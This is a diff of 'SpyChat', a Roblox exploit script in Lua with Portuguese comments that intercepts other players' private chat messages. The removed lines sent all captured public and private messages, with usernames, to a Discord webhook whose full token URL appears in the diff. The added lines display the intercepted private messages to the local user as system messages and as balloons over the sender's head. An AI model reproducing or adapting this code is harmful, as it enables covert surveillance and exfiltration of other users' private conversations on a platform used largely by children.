@@ -1,15 +1,37 @@
-local request = (syn and syn.request) or request or http_request
 local Players = game:GetService("Players")
 local TextChatService = game:GetService("TextChatService")
-local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
-local RunService = game:GetService("RunService")
 
-local webhookURL = "https://discord.com/api/webhooks/1330262990041124895/wL1EwTYqHdQwz_Eyi4XqCZLAqyfv1O8W7rvQLQUNO0s7aKxl3KkyhKPxWrIJ3hBTXUXl"
+-- Envia mensagem de inicialização (apenas para o jogador local)
+local function sendStartupMessage()
+    local message = '<b><font color="#6496FF">SpyChat Working</font></b>'
+    
+    if TextChatService then
+        local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+        if channel then
+            channel:DisplaySystemMessage(message)
+        else
+            game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
+                Text = "SpyChat Working",
+                Color = Color3.fromRGB(100, 150, 255),
+                Font = Enum.Font.SourceSansBold
+            })
+        end
+    else
+        game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
+            Text = "SpyChat Working",
+            Color = Color3.fromRGB(100, 150, 255),
+            Font = Enum.Font.SourceSansBold
+        })
+    end
+end
 
+sendStartupMessage()
+
+-- Tabelas para armazenar mensagens
 local serverMessages = {}
 local clientMessages = {}
-local sentMessages = {}
+local lastCleanup = os.time()
 
 -- Função para criar balão de chat acima do jogador
 local function createChatBalloon(player, message)
@@ -18,12 +40,20 @@ local function createChatBalloon(player, message)
     local head = player.Character:FindFirstChild("Head")
     if not head then return end
     
-    -- Cria um BillboardGui para o balão de chat
+    -- Contar balões existentes para posicionar o novo
+    local existingBalloons = 0
+    for _, child in ipairs(head:GetChildren()) do
+        if child:IsA("BillboardGui") and child.Name == "PrivateChatBalloon" then
+            existingBalloons = existingBalloons + 1
+        end
+    end
+    
     local balloonGui = Instance.new("BillboardGui")
     balloonGui.Adornee = head
     balloonGui.Name = "PrivateChatBalloon"
     balloonGui.Size = UDim2.new(4, 0, 2, 0)
-    balloonGui.StudsOffset = Vector3.new(0, 3, 0)
+    -- Ajustar posição vertical baseada no número de balões existentes
+    balloonGui.StudsOffset = Vector3.new(0, 3 + (existingBalloons * 2), 0)
     balloonGui.AlwaysOnTop = true
     balloonGui.LightInfluence = 1
     balloonGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
@@ -42,7 +72,7 @@ local function createChatBalloon(player, message)
     
     local textLabel = Instance.new("TextLabel")
     textLabel.Text = message
-    textLabel.TextColor3 = Color3.fromRGB(100, 150, 255) -- Azul bebê forte
+    textLabel.TextColor3 = Color3.fromRGB(100, 150, 255)
     textLabel.TextScaled = true
     textLabel.Font = Enum.Font.SourceSansBold
     textLabel.BackgroundTransparency = 1
@@ -54,66 +84,93 @@ local function createChatBalloon(player, message)
     textLabel.Parent = frame
     balloonGui.Parent = head
     
-    -- Remove o balão após alguns segundos
-    delay(5, function()
+    -- Alterado para 10 segundos
+    delay(10, function()
         if balloonGui then
             balloonGui:Destroy()
         end
     end)
 end
 
-local function sendToDiscord(username, displayName, message, isPublic)
-    local messageId = username .. ":" .. message
-    if sentMessages[messageId] then return end
-    sentMessages[messageId] = true
-
-    local emoji = isPublic and "🌐" or "🔒"
-    local data = {
-        ["content"] = string.format("%s **%s (@%s)**: %s", emoji, displayName, username, message),
-        ["username"] = "Roblox Chat Logger (AWP)"
-    }
-
-    -- Se for mensagem privada, cria o balão de chat
-    if not isPublic then
-        local player = Players:FindFirstChild(username)
-        if player then
-            createChatBalloon(player, message)
+-- Função para enviar mensagem privada no chat
+local function sendPrivateChatMessage(username, displayName, message)
+    local formattedMessage = string.format(
+        '<b><font color="#6496FF">🔒 %s (@%s): %s</font></b>',
+        displayName,
+        username,
+        message
+    )
+    
+    if TextChatService then
+        local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+        if channel then
+            channel:DisplaySystemMessage(formattedMessage)
+        else
+            game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
+                Text = "🔒 " .. displayName .. " (@" .. username .. "): " .. message,
+                Color = Color3.fromRGB(100, 150, 255),
+                Font = Enum.Font.SourceSansBold
+            })
         end
-    end
-
-    local success, err = pcall(function()
-        request({
-            Url = webhookURL,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = HttpService:JSONEncode(data)
+    else
+        game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
+            Text = "🔒 " .. displayName .. " (@" .. username .. "): " .. message,
+            Color = Color3.fromRGB(100, 150, 255),
+            Font = Enum.Font.SourceSansBold
         })
-    end)
-
-    if not success then
-        warn("Erro ao enviar para o Discord: " .. err)
     end
 end
 
 local function decideMessageType(username, displayName, message)
-    task.delay(0.5, function()
+    task.delay(1.0, function()
         local key = username .. ":" .. message
-        local isPublic = clientMessages[key] == true
-        sendToDiscord(username, displayName, message, isPublic)
+        local isPublic = (clientMessages[key] and clientMessages[key].value == true)
+        
+        if not isPublic then
+            local foundInClient = false
+            for k, v in pairs(clientMessages) do
+                if k:find(message, 1, true) and v.value == true then
+                    foundInClient = true
+                    break
+                end
+            end
+            
+            if not foundInClient then
+                sendPrivateChatMessage(username, displayName, message)
+                
+                local player = Players:FindFirstChild(username)
+                if player then
+                    createChatBalloon(player, message)
+                end
+            end
+        end
     end)
 end
 
 local function handleServerMessage(player, message)
     local key = player.Name .. ":" .. message
-    serverMessages[key] = true
+    serverMessages[key] = {
+        value = true,
+        timestamp = os.time()
+    }
     decideMessageType(player.Name, player.DisplayName, message)
 end
 
 local function handleClientMessage(username, displayName, message)
+    if os.time() - lastCleanup > 30 then
+        for k, v in pairs(clientMessages) do
+            if os.time() - (v.timestamp or 0) > 30 then
+                clientMessages[k] = nil
+            end
+        end
+        lastCleanup = os.time()
+    end
+    
     local key = username .. ":" .. message
-    clientMessages[key] = true
+    clientMessages[key] = {
+        value = true,
+        timestamp = os.time()
+    }
 end
 
 -- Conexão de mensagens do servidor
@@ -154,8 +211,6 @@ if TextChatService then
     local chatWindow = TextChatService.TextChannels.RBXGeneral
     if chatWindow then
         chatWindow.MessageReceived:Connect(processClientMessage)
-    else
-        warn("Canal de chat RBXGeneral não encontrado!")
     end
 else
     LocalPlayer.Chatted:Connect(function(message)
@@ -163,22 +218,30 @@ else
     end)
 end
 
-local player = game.Players.LocalPlayer
-local screenGui = Instance.new("ScreenGui")
-screenGui.Parent = player:WaitForChild("PlayerGui")
+local Players = game:GetService("Players")
 
--- Criação do TextLabel
-local textLabel = Instance.new("TextLabel")
-textLabel.Parent = screenGui
-textLabel.Text = "Spychat Beta"
-textLabel.Size = UDim2.new(0.1, 0, 0.02, 0)  -- Tamanho bem reduzido
-textLabel.Position = UDim2.new(0.45, 0, 0, 0)  -- Fica bem no topo, de forma discreta
-textLabel.BackgroundTransparency = 1  -- Remove o fundo
-textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)  -- Cor do texto (branco)
-textLabel.TextTransparency = 0.7  -- 30% de transparência no texto (70% opaco)
-textLabel.TextScaled = true  -- Ajusta automaticamente o texto ao tamanho do label
-textLabel.Font = Enum.Font.SourceSansBold
-textLabel.TextStrokeTransparency = 0.8  -- Contorno suave no texto
-textLabel.ZIndex = 100  -- Garante que o texto fique por cima de outros elementos
+local function addWatermark()
+    local playerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
 
+    local watermarkGui = Instance.new("ScreenGui")
+    watermarkGui.Name = "SpyChatWatermark"
+    watermarkGui.ResetOnSpawn = false
+    watermarkGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
+    local label = Instance.new("TextLabel")
+    label.RichText = true
+    label.Text = '<font color="#6496FF">SpychatBeta</font> <i>-By Mickey</i>'
+    label.TextColor3 = Color3.fromRGB(100, 150, 255)
+    label.BackgroundTransparency = 1 -- fundo completamente invisível
+    label.TextScaled = true
+    label.Font = Enum.Font.SourceSans
+    label.Size = UDim2.new(0.2, 0, 0.03, 0)
+    label.Position = UDim2.new(0.01, 0, 0.95, 0)
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.TextYAlignment = Enum.TextYAlignment.Bottom
+
+    label.Parent = watermarkGui
+    watermarkGui.Parent = playerGui
+end
+
+addWatermark()
